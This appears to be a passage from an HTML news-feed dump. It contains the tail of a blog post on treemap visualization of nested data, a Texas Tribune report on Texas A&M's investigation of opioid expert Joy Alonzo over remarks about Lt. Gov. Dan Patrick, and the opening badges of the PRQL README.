</pre></div><p>The size of each rectangle is proportional to the size of the associated tree node and all of its children. The more descendants a tree node has, the bigger its rectangle. As an additional feature, the function that determines the size of leaves and branches can be parameterized, but for our examples, we will assume all leaves have a size of 1 and the size of a branch is the sum of the leaves under it.</p><p>Here's what the process of subdivision looks like.</p><p><img alt="basic subdivide" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/basic-subdivide.gif"></p><p>You can see that the naive treemap shows some of the structure of the data we're trying to visualize, but many elements of the data's structure aren't revealed in this basic treemap. Next, we'll look at a few tricks for improving our treemaps to capture more elements of our data's structure. The following is by no means an exhaustive list of techniques. In fact, there's tremendous room for experimentation and improvement.</p><h2 id="Improving-the-traditional-treemap">Improving the traditional treemap</h2><p>Treemaps are really good at using all the available pixels, but there's still a lot of work left deciding how best to use the pixels given to us. There are several metrics and aspects that are possible to visualize. Let's consider a few.</p><p><strong>Types:</strong> What types are used in the data?<br><strong>Shape:</strong> Is the data deep, shallow, thin, wide?<br><strong>Cardinality:</strong> How much data is there?<br><strong>Constraints:</strong> What properties must the data have for it to be considered valid?</p><h2 id="Types">Types</h2><p>One of the more obvious improvements is to paint the background of each rectangle with the type of the data it represents. Here's what that looks like:</p><p><img alt="Type Background" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/type-background.png"></p><p>Great, now we can see the types of our tree. However, there's a little snag in our plan. It turns out that for most JSON in the wild, the data is mostly comprised of just strings and numbers. It's really higher level data types that we would be interested in, but if we're interested in summarizing the data, it might be because don't have a schema handy. Automatically inferring data types is something we can work on, but let's move on to other options for now.</p><h2 id="Depth">Depth</h2><p>One of the issues with just showing types is that it doesn't tell us much about the actual structure of the data. Just from the types, we can't tell how deep or how wide the data is. If we're not using the background color to represent the types in the data, we can use it for depth:</p><p><img alt="Depth Background" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/depth-background.png"></p><p>Using the color for depth certainly illuminates whether or not our data structure is deep or wide, but it can still be difficult to decipher the structure of the example data. For example, "Which rectangles share the same parent?"</p><h3 id="Grouping">Grouping</h3><p>One way to visualize which rectangles share the same parent is to add a little padding around each level.</p><p><img alt="Depth Background" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/depth-padding.png"></p><p>Awesome. Just a little spacing helps track the different branches of the tree and see which elements share the same parents. However, there are some limitations with using only spacing to show grouping. How much padding should each level of the hierarchy have? Adding too little padding makes the hierarchies less apparent. Adding too much spacing can waste pixels that could otherwise be more effective. The shape of the data will also influence how much padding is necessary. Determining the amount of padding that works well on various different types of data is still an area that needs work.</p><h3 id="Hierarchy-Lines">Hierarchy Lines</h3><p>Another way to visualize the shape of data is to simply draw lines from parents to their children. We can even change the color of the line to show what type each collection is.</p><p><img alt="Line Depth" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/line-bare-demo.png"></p><p>The main drawback of hierarchy lines is that the lines can overlap and obscure descendant rectangles. We can partially alleviate the overlapping issue by reducing the hierarchy line's opacity near the top of the tree. However, for certain data shapes, the lines can still be an issue. Another way to declutter the graphic while still utilizing hierarchy lines is to allow the user to hover over the graphic and only show the hierarchy line of the element that is currently under the mouse.</p><p>Below is a visualization of the same data as above, but using the background to show depth and only showing the hierarchy lines when hovering.</p><p><img alt="Lines Interactive" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/lines-interactive-shrunk.gif"></p><h2 id="Labels">Labels</h2><p>For small examples it's possible to simply label all of the data.</p><pre><code>{:a [0 1 2 3 4],
 :b [0 1 2 3 4],
 :c [0 1 2 3 4]}
</code></pre><p><img alt="Simple Label Example" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/simple-label-example.png"></p><h2 id="Key-path-labels">Key path labels</h2><p>One common form of nesting is maps containing other maps. We can highlight important structural features of the data if we emphasize the map keys in our treemap.</p><p>Below is a treemap of all the public interns of namespaces on treemap-cljs's classpath that start with <code>clojure.*</code>.</p><p><img alt="Keyed Example" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/keyed-example.png"></p><p>As an additional help the user, we allow the user to hover over the data and show the key path that it would take to traverse the data to that leaf node.</p><p><img alt="Hover Keyed Example" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/hover-keypath-shrunk.gif"></p><p>Not only does showing the key path while hovering help show where the data is situated, we can use the key paths as part of the UI itself. As we hover over the keypath, watch as the area for that subsection of the tree is highlighted in the treemap graphic.</p><p><img alt="Hover Box Example" src="https://blog.phronemophobic.com/treemaps-are-awesome/images/keypath-box-hover-shrunk.gif"></p><h2 id="Comparisons-with-alternatives">Comparisons with alternatives</h2><p>There are several tools that help us to gain an intuition for a particular data representation. Let's compare treemaps with other options to see how treemaps can most effectively be used as part of the data exploration toolset.</p><h3 id="Treemaps">Treemaps</h3><p>Treemaps excel at displaying high level structure that is heirarchical, heterogeneous, and approximately square (ie. the data is about as many layers deep as it is wide). Treemaps struggle with data that is either (wide and shallow) or (thin and deep).</p><h3 id="pprint">pprint</h3><p><code>pprint</code> excels at small to medium size data, especially if the data fits on a single page. Once the data takes more than a page to <code>pprint</code>, then it can obscure the shape and structure of the data.</p><h3 id="Data-Browsers">Data Browsers</h3><p>Data browsers like <a href="https://github.com/cognitect-labs/REBL-distro">rebl</a> excel at scanning through data, but typically only show one level of the data at a time. Many data browsers allow graphical integrations, so hopefully treemaps will be <a href="https://github.com/phronmophobic/treemap-clj">integrated</a> within data browsers to allow for the "big picture" data summarization that treemaps provide.</p><h3 id="Schemas">Schemas</h3><p>Schemas excel at providing an abstract summary of data. Schemas have trouble with deeply nested data, data that are out of sync with the schema, and data that don't have a schema. Additionally, schemas don't usually detail real world usage. They often contain properties that are no longer used or have developed new meaning compared to what the original property name would suggest. Schemas are still very useful and can complement tools that work with concrete instances of data like treemaps, <code>pprint</code>, and data browsers.</p><h2 id="Future-Work">Future Work</h2><p><strong>More sophisticated layout</strong><br>Treemap layout in <code>treemap-clj</code> is fairly naive. The layout only considers one level at a time and only uses simple to heuristics to prefer squarish rectangles (aspect ratios close to 1) over long and thin rectangles.</p><p>Currently, layout of the treemap rectangles is only done one layer at at time. It should be possible to produce better (for various metrics of better) layouts by considering more than one layer of the tree at a time.</p><p><strong>Non rectangular treemaps</strong><br>All <code>treemap-clj</code> layouts subdivide rectangles into smaller rectangles. However, the <a href="https://www.uni-konstanz.de/mmsp/pubsys/publishedFiles/NoBr12a.pdf">literature</a> contains algorithms that subdivide areas into other shapes which could have interesting applications.</p><p><strong>Interactive depth rendering</strong><br>Allowing a user to interactively render a treemap up to X level of depth is likely to be an interesting way of exploring a data structure.</p><p><strong>Alternative coloring schemes</strong><br>Only two uses of color have been presented as part of <code>treemap-clj</code>, depth and data type. Other coloring schemes should be investigated.</p><p><strong>Alternative size functions</strong><br>As noted above, all <code>treemap-clj</code> implementations use a leaf size of 1. Plugging in different sizing functions would allow the user to emphasize different elements of a data structure.</p><p><strong>Use Layout direction to encode more information</strong><br>If you look at other visualization graphics, the directions on the chart typically encode information (eg. a financial chart that goes up and to the right is usually a positive sign). The directions on a treemap don't encode any meaning. It should be possible to place rectangles with certain properties close to either the edges or towards the center to emphasize different qualities of the data.</p><p><strong>Graphic Design</strong><br>I'm bad at graphic design and have probably violated innumerable graphic design principles. Incorporating graphic design expertise would greatly increase clarity and legibility.</p><p><strong>Constraints, schemas and specs</strong><br>Formal data specifications encode a ton of information. Encoding these specifications into the treemap graphic should increase the information density.</p><p><strong>Zooming in and out</strong><br>Just like with geographic maps, it should be possible to zoom in on a part of a treemap to reveal more detail or zoom out to view higher level data features.</p><h2 id="Further-Reading">Further Reading</h2><p>Visualizing business information using generalized treemaps<br><a href="https://pure.tue.nl/ws/files/47041749/631721-1.pdf">https://pure.tue.nl/ws/files/47041749/631721-1.pdf</a></p><p>Visualizing Business Data with Generalized Treemaps<br><a href="https://ieeexplore.ieee.org/document/4015431">https://ieeexplore.ieee.org/document/4015431</a></p><p>Computing Voronoi Treemaps<br><a href="https://www.uni-konstanz.de/mmsp/pubsys/publishedFiles/NoBr12a.pdf">https://www.uni-konstanz.de/mmsp/pubsys/publishedFiles/NoBr12a.pdf</a></p><p>Fast Dynamic Voronoi Treemaps<br><a href="https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/isvd.pdf">https://www.microsoft.com/en-us/research/wp-content/uploads/2016/02/isvd.pdf</a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Texas A&M suspended professor accused of criticizing Lt. Gov. Patrick in lecture (210 pts)]]></title>
            <link>https://www.texastribune.org/2023/07/25/texas-a-m-professor-opioids-dan-patrick/</link>
            <guid>36867988</guid>
            <pubDate>Tue, 25 Jul 2023 19:24:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.texastribune.org/2023/07/25/texas-a-m-professor-opioids-dan-patrick/">https://www.texastribune.org/2023/07/25/texas-a-m-professor-opioids-dan-patrick/</a>, See on <a href="https://news.ycombinator.com/item?id=36867988">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
  
    
      <p><em><a href="https://www.texastribune.org/newsletters/the-brief/?utm_medium=website&amp;utm_source=trib-ads-owned&amp;utm_campaign=trib-marketing&amp;utm_term=inline-CTA-brief">Sign up for The Brief</a>, The Texas Tribune‚Äôs daily newsletter that keeps readers up to speed on the most essential Texas news.</em>
</p>
<hr>
    
      <p>Joy Alonzo, a respected opioid expert, was in a panic.</p>

    
      <p>The Texas A&amp;M University professor had just returned home from giving a routine lecture on the opioid crisis at the University of Texas Medical Branch when she learned a student had accused her of disparaging Lt. Gov. <a href="https://www.texastribune.org/directory/dan-patrick/">Dan Patrick</a> during the talk.</p>

    
      <p>In the few hours it took to drive from Galveston, the complaint had made its way to her supervisors, and Alonzo‚Äôs job was suddenly at risk.</p>

    
      <p>‚ÄúI am in a ton of trouble. Please call me!‚Äù she wrote to Chandler Self, the UTMB professor who invited her to speak.</p>

    
      


    
      <p>Alonzo was right to be afraid. Not only were her supervisors involved, but so was Chancellor John Sharp, a former state comptroller who now holds the highest-ranking position in the Texas A&amp;M University System, which includes 11 public universities and 153,000 students. And Sharp was communicating directly with the lieutenant governor‚Äôs office about the incident, promising swift action.</p>

    
      <p>Less than two hours after the lecture ended, Patrick‚Äôs chief of staff had sent Sharp a link to Alonzo‚Äôs professional bio.</p>

    
      <p>Shortly after, Sharp sent a text directly to the lieutenant governor: ‚ÄúJoy Alonzo has been placed on administrative leave pending investigation re firing her. shud [sic] be finished by end of week.‚Äù</p>

    
      <p>The text message was signed ‚Äújsharp.‚Äù</p>

    
      


    
      <p>For free speech advocates, health experts and students, Texas A&amp;M‚Äôs investigation of Alonzo was a shocking demonstration of how quickly university leaders allow politicians to interfere in classroom discussions on topics in which they are not experts ‚Äî and another example of increasing political involvement from state leaders in how Texas universities are managed.</p>

    
      <p>The revelation comes as Texas A&amp;M is reeling over concerns that the university allowed politically motivated outsiders to derail the hiring of <a href="https://www.texastribune.org/2023/07/11/texas-a-m-kathleen-mcelroy-journalism/">Kathleen McElroy</a>, a Black journalism professor at the University of Texas at Austin, to revive the journalism school at Texas A&amp;M. The subsequent outcry over how Texas A&amp;M handled the situation prompted the <a href="https://www.texastribune.org/2023/07/21/tamu-president-resign-journalism/">university president to resign last week</a>, and the interim dean of arts and sciences stepped down from that role but will remain a professor.</p>

    
      <p>In an email obtained by The Texas Tribune through a public records request, Alonzo told Self the investigation had been kicked off by a student ‚Äúwho has ties to Texas A&amp;M Leadership.‚Äù</p>

    
      <p>The Texas A&amp;M system confirmed the series of phone calls and text messages that led to Alonzo‚Äôs investigation was kicked off by Texas Land Commissioner Dawn Buckingham, a graduate of UTMB‚Äôs medical school. The Tribune confirmed her daughter, a first-year medical student at the time, attended Alonzo‚Äôs lecture. Buckingham served six years in the Texas Senate with Patrick, who endorsed her run for land commissioner last year, and she recently attended Sharp‚Äôs wedding in May.</p>

    
      


    
      <p>Buckingham declined to comment.</p>

    
      <p>A few hours after Texas A&amp;M started looking into the complaint, course leaders at UTMB sent an email to students in the class saying Alonzo‚Äôs comments ‚Äúabout Lieutenant Governor Dan Patrick and his role in the opioid crisis‚Äù did not represent the opinion of the university.</p>

    
      <p>The email also included a ‚Äúformal censure‚Äù of Alonzo, although it did not specify what she said that was offensive.</p>

    
      <p>Neither UTMB nor Texas A&amp;M would confirm what Alonzo said that prompted such a reaction, and UTMB students interviewed by the Tribune recalled a vague reference to Patrick‚Äôs office but nothing specific.</p>

    
      


    
      <p>UTMB declined to comment for this story, and Alonzo declined to be interviewed.</p>

    
      <p>Ultimately Texas A&amp;M allowed Alonzo to keep her job after an internal investigation could not confirm any wrongdoing.</p>

    
      <p>In a statement, Texas A&amp;M University System spokesperson Laylan Copelin said Sharp‚Äôs text to Patrick was a ‚Äútypical update,‚Äù saying it is not unusual for the chancellor to ‚Äúkeep elected officials informed when something at Texas A&amp;M might interest them.‚Äù</p>

    
      <p>‚ÄúIt is not unusual to respond to any state official who has concerns about anything occurring at the Texas A&amp;M System,‚Äù said Copelin, who said the system followed standard procedure to look into the claim.</p>

    
      


    
      <p>Patrick did not respond to a request for comment.</p>

    
      <p>Adam Steinbaugh, an attorney with the Foundation for Individual Rights and Expression, a nonprofit legal group focused on protecting free speech on college campuses, said ‚Äúit would be highly inappropriate for a university to conduct an investigation if a faculty member says something critical of a state leader or a government official.‚Äù</p>

    
      <p>‚ÄúThat is, I think, a misuse of institutional resources, and it‚Äôs one that will have a chilling effect and that has a chilling effect even if you wind up clearing the professor,‚Äù Steinbaugh said.</p>

    
      <p>A day after the complaint about Alonzo‚Äôs talk, Marcia Ory, a professor at Texas A&amp;M Health and co-chair of the university‚Äôs Opioid Task Force with Alonzo, warned about the long-term consequences.</p>

    
      


    
      <p>‚ÄúThe incident in Galveston yesterday is probably an indicator of how sensitive and politically charged this topic is and the need to tread lightly and be aware that anything can be taken out of context,‚Äù Ory wrote in an email to Jon Mogford, vice president of Texas A&amp;M Health.</p>

    
      <p>‚ÄúIt‚Äôs a shame because all we want is to make people aware of harm-reduction strategies that can save lives, especially among youth and young adults who are especially vulnerable these days,‚Äù wrote Ory, who did not respond to a request for comment.</p>

    
      <h3 id="78fe6955-84d0-462c-9b97-36fa55d86a66">An expert with a solid reputation</h3>

    
      <p>Alonzo has spent more than two decades as a pharmacist in Japan, Missouri and elsewhere, and has taught college students in Texas for more than a decade. She now teaches at Texas A&amp;M while working as an ambulatory care pharmacy director at a free health clinic in Bryan.</p>

    
      <p>She has helped bring millions of federal research dollars to the university, and last year Texas A&amp;M‚Äôs pharmacy school <a href="https://pharmacy.tamu.edu/awards/index.html#tab-panel-5">named her the early career researcher of the year</a>.</p>

    
      


    
      <p>One of Alonzo‚Äôs recent projects focuses on training people to use Narcan, a nasal spray that reverses opioid effects and can save lives in overdose cases. She‚Äôs also advised state leaders on other public policies that could improve the fight against opioid overdoses.</p>

    
      <p>Fentanyl, a synthetic opioid often illegally manufactured by Mexican drug cartels, is a growing problem. Between 2019 and 2021, overdose deaths involving fentanyl in the state rose nearly 400%.</p>

    
      <p>This year, Gov. <a href="https://www.texastribune.org/directory/greg-abbott/">Greg Abbott</a> declared cracking down on fentanyl as one of his seven priority issues for the legislative session.</p>

    
      <p>Lawmakers allocated <a href="https://www.texastribune.org/2023/05/27/texas-legislature-budget/">$18 million over the next two years toward providing naloxone</a>, an opioid-reversing drug, to police, schools and community organizations on the front lines of the epidemic. To improve the government‚Äôs response to overdose spikes, they also passed laws requiring police and other public entities to report overdoses to a public health agency.</p>

    
      


    
      <p>But instead of backing other recommended strategies to reduce overdose deaths, such as legalizing test strips that can detect the presence of fentanyl in other drugs, lawmakers focused on a more <a href="https://www.texastribune.org/2023/05/16/texas-fentanyl-murder-legislature/">punitive approach</a>, approving laws that increase criminal penalties for providing fentanyl that leads to an overdose death.</p>

    
      <p>Public health experts like Alonzo have largely supported harm-reduction efforts rather than increasing punishments for drug users. As the crisis intensified, Alonzo often received urgent emails from Texas school districts and law enforcement agencies eager for training and naloxone kits. In the past, she estimated she had given away <a href="https://www.texastribune.org/2022/08/03/texas-narcan-opioids/">more than $4.5 million worth of naloxone</a> through her training sessions.</p>

    
      <h3 id="5eb9112d-066a-47c3-a240-7a994e79f4af">Statement of formal censure</h3>

    
      <p>Self, the professor at UTMB, scheduled Alonzo to give the lecture to the first-year medical students months in advance.</p>

    
      <p>‚ÄúI can‚Äôt tell you enough how much the students value this presentation,‚Äù Self wrote in October, according to emails obtained through an open records request. ‚ÄúI get feedback all the time from them telling me how important they view this talk. They‚Äôll come up to me even months later to tell me.‚Äù</p>

    
      


    
      <p>On March 7, the two started the day with breakfast at the laid-back Mosquito Cafe in Galveston before heading to the lecture, which was mandatory for students to attend.</p>

    
      <p>The lecture was not recorded, but according to presentation slides obtained by the Tribune through an open records request, Alonzo gave students a broad overview of the opioid crisis and the science behind opioids. She walked them through how to prevent opioid deaths, how to recognize an overdose and how to administer naloxone. She even touched on what to do if a police dog was exposed to fentanyl.</p>

    
      <p>The slides show that Alonzo discussed how a lack of infrastructure limits the state‚Äôs ability to respond to the crisis, noting that many Texas counties lack a medical examiner; reporting on opioid deaths by emergency rooms is infrequent; and many law enforcement agencies and local health departments don‚Äôt track opioid deaths.</p>

    
      <p>This means the U.S. Centers for Disease Control and Prevention considers Texas a nonreporter when it comes to opioid data, which makes it more difficult for researchers to receive grants to tackle the issue. (Alonzo gave her presentation before the Legislature passed new reporting laws this year.)</p>

    
      


    
      <p>The lecture ended around noon. Afterward, students gathered at the front of the class to grab free naloxone kits provided by Alonzo. Some stuck around to ask Alonzo questions.</p>

    
      <p>The course‚Äôs instructors gave no indication anything had gone awry.</p>

    
      <p>Alonzo got in her car and started her two-and-a-half-hour journey home.</p>

    
      <p>At 4:22 p.m., as Alonzo was learning that a controversy was brewing, a course coordinator sent an email to the entire class distancing UTMB from comments Alonzo allegedly made about Patrick. The subject line read, ‚ÄúSTATEMENT OF FORMAL CENSURE.‚Äù</p>

    
      


    
      <p>‚ÄúThe statements made by the guest lecturer do not represent the opinion or position of the University of Texas Medical Branch, nor are they considered as core curriculum content for this course,‚Äù the email said.</p>

    
      <p>‚ÄúUTMB does not support or condone these comments. We take these matters very seriously and wish to express our disapproval of the comment and apologize for harm it may have caused for members of our community,‚Äù the email continued. ‚ÄúWe hereby issue a formal censure of these statements and will take steps to ensure that such behavior does not happen in the future.‚Äù</p>

    
      <p>The email did not specify what comments had led to the censure.</p>

    
      <p>The trouble had started several hours earlier when Buckingham called Patrick to alert him that an A&amp;M professor had made negative comments about him during a guest lecture at UTMB, said Copelin, the A&amp;M system spokesperson. Buckingham then called Jenny Jones, the university system‚Äôs vice chancellor for governmental relations.</p>

    
      <p>Copelin said a text message had alerted Buckingham of the comments, but he did not provide information on who sent the text message.</p>

    
      <p>Patrick then called Sharp and Kevin Eltife, the chair of the University of Texas System‚Äôs board, Copelin said. The call between Sharp and Patrick was short. Patrick‚Äôs chief of staff, Darrell Davila, followed with the text to Sharp that linked to Alonzo‚Äôs faculty page. Eltife declined to comment.</p>

    
      <p>Sharp had a staff member look into the complaint and that staff member asked then-A&amp;M President M. Katherine Banks' office to investigate.</p>

    
      <p>Copelin said Sharp‚Äôs request went through the chain of command at A&amp;M‚Äôs Health Science Center and ended up with Kevin McGinnis, the system‚Äôs vice president and chief compliance officer.</p>

    
      <p>At the same time, the government relations team alerted the Health Science Center and the pharmacy school, which are affiliated with Alonzo, Copelin said.</p>

    
      <p>A&amp;M officials received a copy of UTMB‚Äôs censure statement and reached out for more information, but UTMB did not cooperate, Copelin said.</p>

    
      <p>‚ÄúBy the close of the day, McGinnis decided to put Alonzo on paid leave and investigate to determine what really happened,‚Äù Copelin said in a statement.</p>

    
      <p>As the situation developed, A&amp;M officials updated Patrick and his team.</p>

    
      <p>At 4:43 p.m., just 15 minutes after UTMB sent its official censure letter, Jones alerted Patrick‚Äôs deputy chief of staff, Marian Wallace, that the investigation was underway.</p>

    
      <p>‚Äújoy alonzo placed on administrative leave pending firing investigation this week js,‚Äù read the message from Jones obtained by the Tribune through a public records request.</p>

    
      <p>Copelin said the university‚Äôs handling of the complaint against Alonzo followed standard procedure and appropriately updated the relevant lawmakers on the investigation‚Äôs progress.</p>

    
      <p>‚ÄúThe investigation into the matter was a reasonable step to take, particularly after UTMB issued a public statement ‚Äòcensuring‚Äô one of our faculty members,‚Äù he said. ‚ÄúIn fact, it would have been irresponsible not to look into it.‚Äù</p>

    
      <p>Texas A&amp;M would not answer questions about what specific policy Alonzo may have violated with her comments or provide documents pertaining to the investigation, citing state law that allows a university to withhold such information if a person is cleared of wrongdoing.</p>

    
      <p>The timing of the complaint came as the legislative session was heating up. Universities, including Texas A&amp;M, were making pitches to lawmakers to devote some of the state‚Äôs multibillion-dollar surplus to fund special projects.</p>

    
      <p>Alonzo‚Äôs predicament also comes as Texas universities are dealing with increasing government involvement in ostensibly independent public universities, particularly at the hand of Patrick, whom Alonzo was accused of criticizing. This year, Texas lawmakers banned diversity, equity and inclusion offices on college campuses, a priority for Patrick. These offices target underrepresented groups on campus to help them succeed, but critics accused them of pushing ‚Äúwoke,‚Äù left-leaning ideology on students and faculty.</p>

    
      <p>Patrick also prioritized a bill that would limit certain conversations about race and gender in college classrooms. When professors at UT-Austin publicly reaffirmed their academic freedom to teach critical race theory last year, Patrick pledged to ban tenure in public universities. Ultimately, that proposal was unsuccessful, but faculty say the broad attack on higher education has made Texas a less appealing and more difficult place to work.</p>

    
      <h3 id="726d246a-82c6-4ff6-878e-b272043da1fa">Students scramble to understand what happened</h3>

    
      <p>When students at UTMB received the email hours after the lecture, several started texting each other, trying to figure out what Alonzo had said that was so offensive.</p>

    
      <p>According to one student who asked to remain anonymous for fear of retaliation from the school, some students wondered if it was when Alonzo said that the lieutenant governor‚Äôs office was one of the reasons it‚Äôs hard for drug users to access certain care for opioid addiction or overdoses.</p>

    
      <p>A second student who also asked to remain anonymous for the same reason said Alonzo made a comment that the lieutenant governor‚Äôs office had opposed policies that could have prevented opioid-related deaths, and by doing so had allowed people to die.</p>

    
      <p>A third student who also spoke on the condition of anonymity said Alonzo talked about how policies, like the state‚Äôs ban on fentanyl test strips, have a direct impact on the ability to prevent opioid overdoses and deaths. A push to legalize the test strips died earlier this year in the Patrick-led Senate <a href="https://www.texastribune.org/2022/12/01/greg-abbott-fentanyl-strips-opioid-overdose/">despite support from top Republicans</a>, including Abbott.</p>

    
      <p>All of the students interviewed said they felt Alonzo‚Äôs comments were accurate and they were not offended by anything in the presentation.</p>

    
      <p>In a statement provided by Copelin, the A&amp;M system spokesperson, Alonzo said ‚Äúher remarks were mischaracterized and taken out of context,‚Äù but she did not confirm exactly what the comments were.</p>

    
      <p>‚ÄúShe added that she had no issue with how the university handled the situation,‚Äù Copelin said.</p>

    
      <p>The third student at UTMB said the email from the school was frustrating because it was unclear which comments the university found problematic.</p>

    
      <p>‚ÄúWe‚Äôve been left wondering exactly what it was they objected to,‚Äù the student said. ‚ÄúThat vagueness just leads to some more self-censorship, since it‚Äôs hard to tell what is and isn‚Äôt allowed.‚Äù</p>

    
      <p>Steinbaugh, an attorney with the legal nonprofit FIRE, said schools have the right to criticize an employee or guest speaker for statements they make, but issuing a formal censure sends a strong and unambiguous message.</p>

    
      <p>‚ÄúThat is a suggestion that if you repeat this language or these criticisms, then you will be subject to disciplinary consequences that go beyond formal censure,‚Äù he said. ‚ÄúThat is a way to really put an exclamation point on the chilling effect.‚Äù</p>

    
      <p>In a statement last week to faculty who were upset about the fallout over the botched hiring of McElroy to the journalism department, Sharp expressed concern about outside influences in the hiring and promotion of faculty, saying it was ‚Äúnever welcome, nor invited.‚Äù</p>

    
      <p>Sharp said he only participates in hiring questions over the school‚Äôs president and vice chancellors for agriculture and engineering.</p>

    
      <p>‚ÄúOther than that, I don‚Äôt believe it is my place to be part of the hiring process for faculty,‚Äù he wrote.</p>

    
      <h3 id="63d5c3e1-348a-4dad-aa96-c99b1f7f5ab1">Fear of a chilling effect on life-saving information</h3>

    
      <p>A few hours after Alonzo reached out to Self about the trouble she was in, she finally heard back. But the tone of the email was notably different from the earlier cordial exchanges.</p>

    
      <p>Self said she did not record the lecture and noted that ‚Äúall further correspondence will be funneled through our Office of Education.‚Äù</p>

    
      <p>Self referred a request for comment by the Tribune to UTMB‚Äôs media relations department, which declined to discuss the situation.</p>

    
      <p>Meanwhile, emails obtained through an open records request show that opioid experts and advocates across the state started sending Alonzo letters of support that evening.</p>

    
      <p>‚ÄúI‚Äôve never seen her to be anything other than professional, knowledgeable, and compassionate,‚Äù wrote Kathy Posey, who helped start the <a href="https://www.facebook.com/groups/mocope/">Montgomery County Overdose Prevention Endeavor</a>, an opioid overdose awareness group made up of people whose family members have been addicted to opioids or died from an overdose.</p>

    
      <p>Lucas Hill, a clinical associate professor of pharmacy at the University of Texas at Austin, wrote in his letter that Alonzo was not a divisive educator.</p>

    
      <p>‚ÄúWhile I was not present during her guest lecture at the University of Texas Medical Branch this morning, my interactions with Dr. Alonzo gives me great confidence that she engages learners in discussions of controversial topics with the professionalism and restraint described in established principles of academic freedom,‚Äù he wrote.</p>

    
      <p>The stakes are high for professors who simultaneously work in their fields and teach, many of whom, like Alonzo, do not have tenure. And it raises concerns that medical experts working on high-stakes issues like the opioid crisis might withhold important, life-saving information out of fear of reprimand or punishment.</p>

    
      <p>‚ÄúWhen we‚Äôre dealing with basic life-saving interventions, chilling effects can have much more deep consequences,‚Äù said Aaron Ferguson, an addiction treatment expert in Austin who works with researchers at public universities to combat opioid overdoses. ‚ÄúPeople don't feel emboldened to share basic science that could save people‚Äôs lives.‚Äù</p>

    
      <h3 id="27a2cc16-e71b-4278-ae93-73e19e552669">‚ÄúSome members of the audience‚Äù were offended</h3>

    
      <p>On March 21, two weeks after she was placed on paid leave, Alonzo received an email saying her leave had been lifted.</p>

    
      <p>The following day, pharmacy school Dean George Udeani said in a memo to Alonzo that during the lecture she ‚Äúrelated an anecdote and an interaction with a state official.‚Äù</p>

    
      <p>‚ÄúI understand that your comment did not assign blame. However, some members of the audience felt that your anecdote was offensive,‚Äù he wrote.</p>

    
      <p>‚ÄúWhile it is important to preserve and defend academic freedom and as such be able to discuss and present to students and the public the results of research observations and strategies, you should be mindful of how you present your views,‚Äù Udeani said.</p>

    
      <p><i>Disclosure: Texas A&amp;M University, Texas A&amp;M University System, University of Texas at Austin, University of Texas System and Kathleen McElroy have been financial supporters of The Texas Tribune, a nonprofit, nonpartisan news organization that is funded in part by donations from members, foundations and corporate sponsors. Financial supporters play no role in the Tribune's journalism. Find a complete <a href="https://www.texastribune.org/support-us/corporate-sponsors/">list of them here</a>.</i></p>

    
      <hr>

    
      <p><em>Join us for conversations that matter with newly announced speakers at the <a href="https://festival-platform.texastribune.org/?promo=site-story-footer&amp;tr=true" rel="noopener" target="_blank">2023 Texas Tribune Festival</a>, in downtown Austin from Sept. 21-23.</em></p>

    
  
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[PRQL: Pipelined Relational Query Language (396 pts)]]></title>
            <link>https://github.com/PRQL/prql</link>
            <guid>36866861</guid>
            <pubDate>Tue, 25 Jul 2023 18:13:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/PRQL/prql">https://github.com/PRQL/prql</a>, See on <a href="https://news.ycombinator.com/item?id=36866861">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">PRQL</h2>

<p dir="auto"><a href="https://prql-lang.org/" rel="nofollow"><img src="https://camo.githubusercontent.com/9d310183f968381c446a43f1225521cfe7755af675ba04d7cc648d1aa3f348a8/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f494e54524f2d5745422d626c75653f7374796c653d666f722d7468652d6261646765" alt="Website" data-canonical-src="https://img.shields.io/badge/INTRO-WEB-blue?style=for-the-badge"></a>
<a href="https://prql-lang.org/playground" rel="nofollow"><img src="https://camo.githubusercontent.com/68e68473f42ca8d5d31d7a86e27bd1d2a9b08425a959073425d3163bda127e39/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f494e54524f2d504c415947524f554e442d626c75653f7374796c653d666f722d7468652d6261646765" alt="Playground" data-canonical-src="https://img.shields.io/badge/INTRO-PLAYGROUND-blue?style=for-the-badge"></a>
<a href="https://prql-lang.org/book" rel="nofollow"><img src="https://camo.githubusercontent.com/91acdbb5a1171a4092ebccf530cd2e015b67a8264fc41402d283b9a201a76a29/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f444f43532d424f4f4b2d626c75653f7374796c653d666f722d7468652d6261646765" alt="Language Docs" data-canonical-src="https://img.shields.io/badge/DOCS-BOOK-blue?style=for-the-badge"></a>
<a href="https://discord.gg/eQcfaCmsNc" rel="nofollow"><img src="https://camo.githubusercontent.com/3d5cec0c7f1816c3d516aa343bba76dd86bbfaa93a3d7c3436e23756b3cf9555/68747470733a2f2f696d672e736869656c64732e696f2f646973636f72642f3933363732383131363731323331363938393f6c6162656c3d646973636f726425323063686174267374796c653d666f722d7468652d6261646765" alt="Discord" data-canonical-src="https://img.shields.io/discord/936728116712316989?label=discord%20chat&amp;style=for-the-badge"></a></p>



<p dir="auto"><a href="https://github.com/PRQL/prql/actions?query=branch%3Amain+workflow%3Atest-all"><img src="https://camo.githubusercontent.com/743fbd692fee4a030f7eb1b37e96f271fa2091fa2a0a7b3f52480be2fb265e12/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f616374696f6e732f776f726b666c6f772f7374617475732f5052514c2f7072716c2f70756c6c2d726571756573742e79616d6c3f6272616e63683d6d61696e266c6f676f3d676974687562267374796c653d666f722d7468652d6261646765" alt="GitHub CI Status" data-canonical-src="https://img.shields.io/github/actions/workflow/status/PRQL/prql/pull-request.yaml?branch=main&amp;logo=github&amp;style=for-the-badge"></a>
